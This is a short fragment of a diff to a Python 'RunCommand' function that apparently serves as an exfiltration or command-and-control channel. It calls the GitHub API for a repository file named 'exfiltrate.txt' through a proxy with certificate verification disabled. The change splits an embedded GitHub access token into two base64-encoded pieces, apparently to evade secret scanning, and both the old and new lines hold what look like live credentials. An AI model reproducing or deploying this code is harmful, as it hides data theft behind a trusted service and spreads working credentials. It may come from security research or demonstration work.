@@ -29,11 +29,12 @@ def RunCommand():
     # print(r.status_code)
     # print(r.text)
     # text_to_send+=str(r.text)
-
+    t = str(base64.b64decode("Z2l0aHViX3BhdF8xMUFNRU5FN1E="))
+    t += str(base64.b64decode("ME5iRExmdnBzV0RWRl9uQk5JUUEwdXZQTU5OTGR6b3ozUDBiMkJ1Rmp2MGdPbUpsOW95bXdoUERDVDdMQ01aVDI2WHh5Mk8xRw==="))
     url = "https://api.github.com/repos/androne23/this_is_fine_wuzzi/contents/exfiltrate.txt"
     headers = {
     'Accept': 'application/vnd.github+json',
-    'Authorization': 'Bearer ' + str(base64.b64decode("Z2l0aHViX3BhdF8xMUFNRU5FN1EwS1NWbGgwTEVkTVVzX28wb2RTOHZmSm5SdG4xamlTUTZFNEhtbzVqaUIyNFE5azRqM21ISVNDemhGQjNOV0pKVVFaVUw1ODFL")),
+    'Authorization': 'Bearer ' + t,
     }
 
     response = requests.request("GET", url, headers=headers, proxies=proxies, verify=False)
